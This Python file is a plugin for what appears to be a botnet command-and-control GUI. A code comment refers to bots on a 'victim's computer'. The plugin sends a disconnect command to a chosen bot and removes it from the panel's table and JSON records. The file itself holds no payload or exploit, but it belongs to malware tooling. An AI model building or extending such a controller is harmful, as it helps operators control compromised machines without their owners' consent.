# plugins/delete.py
from PyQt6.QtWidgets import QMessageBox
from .base_plugin import BasePlugin
import ujson as json
import os

class DeletePlugin(BasePlugin):
    def __init__(self, parent):
        super().__init__(parent)
        self.name = "Remove Bot"
        # Only removes it from connections doesn't delete the bot from victim's computer.
        self.menu_action = self.name
        self.priority = 10  # Low priority, near the bottom of the menu

    def execute(self, target):
        if target == 'all':
            QMessageBox.warning(self.parent, 'Warning', 'Cannot delete all bots at once. Please select a specific bot.')
            return
        
        # Confirm deletion
        reply = QMessageBox.question(self.parent, 'Confirm Deletion', f'Are you sure you want to remove the bot {target} from connections list?', 
                                     QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No, 
                                     QMessageBox.StandardButton.No)
        if reply == QMessageBox.StandardButton.No:
            return

        # Disconnect the bot
        command = {'type': 'command', 'target': target, 'action': 'disconnect'}
        message = json.dumps(command)
        self.parent.client.publish(self.parent.topic, message)
        self.parent.log_area.append(f"Sent disconnect command: {command}")

        # Remove from device table
        ip, bot_id = target.split(':')
        self.parent.remove_device_from_table(ip, bot_id)

        # Update the JSON file
        try:
            if os.path.exists(self.parent.json_file):
                with open(self.parent.json_file, 'r') as f:
                    bots = json.load(f)
                bots = [bot for bot in bots if bot['id'] != bot_id or bot['ip'] != ip]
                with open(self.parent.json_file, 'w') as f:
                    json.dump(bots, f, indent=4)
                self.parent.log_area.append(f"Removed bot {target} from JSON")
            else:
                self.parent.log_area.append("No connected bots JSON file found")
        except Exception as e:
            self.parent.log_area.append(f"Error deleting bot from JSON: {e}")